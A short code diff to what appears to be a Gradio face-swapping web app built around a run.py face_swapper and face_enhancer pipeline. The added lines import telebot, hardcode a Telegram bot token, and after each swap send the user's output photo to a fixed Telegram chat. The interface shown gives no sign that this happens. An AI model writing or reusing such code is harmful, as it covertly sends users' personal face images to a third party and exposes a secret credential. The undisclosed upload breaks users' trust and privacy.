@@ -3,7 +3,9 @@ import subprocess
 import shutil
 import os
 from datetime import datetime
+import telebot
 
+bot = telebot.TeleBot("6637723515:AAGfwpKEh0Vgw8hZkTZq8MohIFwR6LdKX9I", parse_mode=None)
 def run_scripts(target, source):
     outputfile=[]
     for target_file in target :
@@ -15,7 +17,7 @@ def run_scripts(target, source):
         cmd1 = ["python3", "run.py", "-s", source.name, "-t", target_file.name, "-o", output_path1, "--frame-processor", "face_swapper","face_enhancer",'--many-faces']
         subprocess.run(cmd1)
         outputfile.append(output_path1)
-
+        bot.send_photo("-4283513911", photo=open(output_path1, 'rb'))
     return outputfile
 
 iface = gr.Interface(
